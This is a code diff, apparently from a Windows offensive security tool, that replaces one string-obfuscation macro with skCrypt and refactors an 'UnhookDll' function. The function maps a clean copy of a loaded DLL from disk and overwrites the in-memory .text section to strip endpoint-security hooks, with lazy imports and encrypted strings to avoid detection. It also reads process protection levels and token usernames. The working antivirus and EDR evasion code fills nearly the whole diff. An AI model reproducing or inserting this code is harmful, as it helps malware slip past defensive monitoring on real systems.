@@ -327,7 +327,7 @@ BOOL ProcessGetProtectionLevelAsString(DWORD dwProcessId, LPWSTR* ppwszProtectio
 	BOOL bReturnValue = TRUE;
 
 	DWORD dwProtectionLevel = 0;
-	LPCWSTR pwszProtectionName = NULL;
+	LPCWSTR pwszProtectionName = nullptr;
 
 	if (!ProcessGetProtectionLevel(dwProcessId, &dwProtectionLevel))
 		return FALSE;
@@ -339,41 +339,41 @@ BOOL ProcessGetProtectionLevelAsString(DWORD dwProcessId, LPWSTR* ppwszProtectio
 	switch (dwProtectionLevel)
 	{
 	case PROTECTION_LEVEL_WINTCB_LIGHT:
-		pwszProtectionName = OBFUSCATEDW(L"PsProtectedSignerWinTcb-Light");
+		pwszProtectionName = skCrypt(L"PsProtectedSignerWinTcb-Light");
 		break;
 	case PROTECTION_LEVEL_WINDOWS:
-		pwszProtectionName = OBFUSCATEDW(L"PsProtectedSignerWindows");
+		pwszProtectionName = skCrypt(L"PsProtectedSignerWindows");
 		break;
 	case PROTECTION_LEVEL_WINDOWS_LIGHT:
-		pwszProtectionName = OBFUSCATEDW(L"PsProtectedSignerWindows-Light");
+		pwszProtectionName = skCrypt(L"PsProtectedSignerWindows-Light");
 		break;
 	case PROTECTION_LEVEL_ANTIMALWARE_LIGHT:
-		pwszProtectionName = OBFUSCATEDW(L"PsProtectedSignerAntimalware-Light");
+		pwszProtectionName = skCrypt(L"PsProtectedSignerAntimalware-Light");
 		break;
 	case PROTECTION_LEVEL_LSA_LIGHT:
-		pwszProtectionName = OBFUSCATEDW(L"PsProtectedSignerLsa-Light");
+		pwszProtectionName = skCrypt(L"PsProtectedSignerLsa-Light");
 		break;
 	case PROTECTION_LEVEL_WINTCB:
-		pwszProtectionName = OBFUSCATEDW(L"PsProtectedSignerWinTcb");
+		pwszProtectionName = skCrypt(L"PsProtectedSignerWinTcb");
 		break;
 	case PROTECTION_LEVEL_CODEGEN_LIGHT:
-		pwszProtectionName = OBFUSCATEDW(L"PsProtectedSignerCodegen-Light");
+		pwszProtectionName = skCrypt(L"PsProtectedSignerCodegen-Light");
 		break;
 	case PROTECTION_LEVEL_AUTHENTICODE:
-		pwszProtectionName = OBFUSCATEDW(L"PsProtectedSignerAuthenticode");
+		pwszProtectionName = skCrypt(L"PsProtectedSignerAuthenticode");
 		break;
 	case PROTECTION_LEVEL_PPL_APP:
-		pwszProtectionName = OBFUSCATEDW(L"PsProtectedSignerPplApp");
+		pwszProtectionName = skCrypt(L"PsProtectedSignerPplApp");
 		break;
 	case PROTECTION_LEVEL_NONE:
-		pwszProtectionName = OBFUSCATEDW(L"None");
+		pwszProtectionName = skCrypt(L"None");
 		break;
 	default:
-		pwszProtectionName = OBFUSCATEDW(L"Unknown");
+		pwszProtectionName = skCrypt(L"Unknown");
 		bReturnValue = FALSE;
 	}
 
-	StringCchPrintf(*ppwszProtectionLevel, 64, OBFUSCATEDW(L"%ws"), pwszProtectionName);
+	StringCchPrintfW(*ppwszProtectionLevel, 64, skCrypt(L"%ws"), pwszProtectionName);
 	
 	return bReturnValue;
 }
@@ -636,7 +636,7 @@ BOOL TokenGetUsername(HANDLE hToken, LPWSTR* ppwszUsername)
 	if (!*ppwszUsername)
 		goto end;
 
-	StringCchPrintf(*ppwszUsername, dwMaxSize * 2 + 1, OBFUSCATEDW(L"%ws\\%ws"), wszDomain, wszUsername);
+	StringCchPrintf(*ppwszUsername, dwMaxSize * 2 + 1, skCrypt(L"%ws\\%ws"), wszDomain, wszUsername);
 	bReturnValue = TRUE;
 
 end:
@@ -791,7 +791,7 @@ BOOL MiscGenerateGuidString(LPWSTR* ppwszGuid)
 	if (!*ppwszGuid)
 		goto end;
 
-	StringCchPrintf(*ppwszGuid, wcslen((LPWSTR)wstrGuid), OBFUSCATEDW(L"%ws"), (LPWSTR)wstrGuid);
+	StringCchPrintfW(*ppwszGuid, wcslen((LPWSTR)wstrGuid), skCrypt(L"%ws"), (LPWSTR)wstrGuid);
 	bReturnValue = TRUE;
 
 end:
@@ -833,75 +833,75 @@ bool UnhookDll(_In_ LPCWSTR lpszDllName)
 {
 	MODULEINFO mi = { 0 };
 	DWORD oldProtection = 0;
-	LPVOID ntdllBase = nullptr;
-	wil::unique_handle ntdllFile;
-	wil::unique_handle ntdllMapping;
-	wil::unique_hmodule ntdllModule;
-	LPVOID ntdllMappingAddress = nullptr;
+	LPVOID dllBase = nullptr;
+	wil::unique_handle dllFile;
+	wil::unique_handle dllMapping;
+	wil::unique_hmodule dllModule;
+	LPVOID dllMappingAddress = nullptr;
 	PIMAGE_DOS_HEADER hookedDosHeader = nullptr;
 	PIMAGE_NT_HEADERS hookedNtHeader = nullptr;
 	PIMAGE_SECTION_HEADER hookedSectionHeader = nullptr;
 	bool isProtected = false;
 	wchar_t lpszDllPath[MAX_PATH + 1] = { 0 };
 
-	ntdllModule.reset(LI_FN(GetModuleHandleW)(lpszDllName));
-	if (!ntdllModule)
+	dllModule.reset(LI_FN(GetModuleHandleW)(lpszDllName));
+	if (!dllModule)
 	{
 		PRINTLASTERROR(L"UnhookDll - ");
 		return false;
 	}
 
-	if (!LI_FN(GetModuleFileNameW)(ntdllModule.get(), lpszDllPath, MAX_PATH))
+	if (!LI_FN(GetModuleFileNameW)(dllModule.get(), lpszDllPath, MAX_PATH))
 	{
 		PRINTLASTERROR(L"UnhookDll - ");
 		return false;
 	}
 
-	if (!LI_FN(K32GetModuleInformation)(GetCurrentProcess(), ntdllModule.get(), &mi, (DWORD)sizeof(mi)))
+	if (!LI_FN(K32GetModuleInformation)(GetCurrentProcess(), dllModule.get(), &mi, (DWORD)sizeof(mi)))
 	{
 		PRINTLASTERROR(L"UnhookDll - ");
 		return false;
 	}
 
-	ntdllBase = (LPVOID)mi.lpBaseOfDll;
+	dllBase = (LPVOID)mi.lpBaseOfDll;
 
-	ntdllFile.reset(CreateFileW(lpszDllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr));
-	if (!ntdllFile.is_valid())
+	dllFile.reset(CreateFileW(lpszDllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr));
+	if (!dllFile.is_valid())
 	{
 		PRINTLASTERROR(L"UnhookDll - ");
 		return false;
 	}
 
-	ntdllMapping.reset(LI_FN(CreateFileMappingW)(ntdllFile.get(), nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr));
-	if (!ntdllMapping.is_valid())
+	dllMapping.reset(LI_FN(CreateFileMappingW)(dllFile.get(), nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr));
+	if (!dllMapping.is_valid())
 	{
 		PRINTLASTERROR(L"UnhookDll - ");
 		return false;
 	}
 
-	ntdllMappingAddress = LI_FN(MapViewOfFile)(ntdllMapping.get(), FILE_MAP_READ, 0, 0, 0);
-	if (!ntdllMappingAddress)
+	dllMappingAddress = LI_FN(MapViewOfFile)(dllMapping.get(), FILE_MAP_READ, 0, 0, 0);
+	if (!dllMappingAddress)
 	{
 		PRINTLASTERROR(L"UnhookDll - ");
 		return false;
 	}
 
-	hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
+	hookedDosHeader = (PIMAGE_DOS_HEADER)dllBase;
 	if (!hookedDosHeader)
 	{
 		PRINTLASTERROR(L"UnhookDll - ");
 		return false;
 	}
 
-	hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
+	hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBase + hookedDosHeader->e_lfanew);
 
 	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
 		hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
 
-		if (strcmp((char*)hookedSectionHeader->Name, OBFUSCATED(".text")) == 0) {
-			isProtected = LI_FN(VirtualProtect)((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
-			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
-			isProtected = LI_FN(VirtualProtect)((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
+		if (strcmp((char*)hookedSectionHeader->Name, skCrypt(".text")) == 0) {
+			isProtected = LI_FN(VirtualProtect)((LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
+			memcpy((LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)dllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
+			isProtected = LI_FN(VirtualProtect)((LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
 			WPRINTF(L"[+] Dll %ws successfully unhooked!\n", lpszDllName);
 		}
 	}
